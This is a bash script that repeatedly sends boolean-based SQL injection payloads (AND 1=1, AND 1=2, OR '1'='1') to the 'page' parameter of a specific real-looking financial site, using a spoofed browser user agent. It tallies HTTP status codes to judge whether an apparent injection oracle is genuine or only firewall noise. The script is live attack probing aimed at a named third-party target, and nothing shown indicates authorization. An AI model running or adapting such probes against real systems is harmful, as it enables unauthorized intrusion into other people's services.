#!/bin/bash
# PROVE the differential is WAF noise: interleave TRUE/FALSE/NON-INJECTABLE many times.
# If responses are driven by WAF challenge randomness, TRUE and FALSE will be indistinguishable.
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
B="https://www.infinitycapital.bh"
# payloads: a=plain, b=AND 1=1, c=AND 1=2, d=total garbage (no SQL meaning)
declare -A P
P[a]="1"
P[b]="1%20AND%201%3D1"
P[c]="1%20AND%201%3D2"
P[d]="zzzz%27%20OR%20%271%27%3D%271"
declare -A C200 C403
for round in 1 2 3 4 5 6; do
  for k in a b c d; do
    code=$(curl -sk -o /tmp/x.body -w "%{http_code}" -A "$UA" "$B/?page=${P[$k]}")
    if [ "$code" = "200" ]; then C200[$k]=$(( ${C200[$k]:-0} + 1 )); else C403[$k]=$(( ${C403[$k]:-0} + 1 )); fi
    sleep 0.6
  done
done
echo "200-counts: a(plain)=${C200[a]:-0} b(AND1=1)=${C200[b]:-0} c(AND1=2)=${C200[c]:-0} d(garbage)=${C200[d]:-0}"
echo "403-counts: a=${C403[a]:-0} b=${C403[b]:-0} c=${C403[c]:-0} d=${C403[d]:-0}"
echo "NOTE: if 200/403 split is random across ALL payloads, the oracle is WAF noise, not SQL."
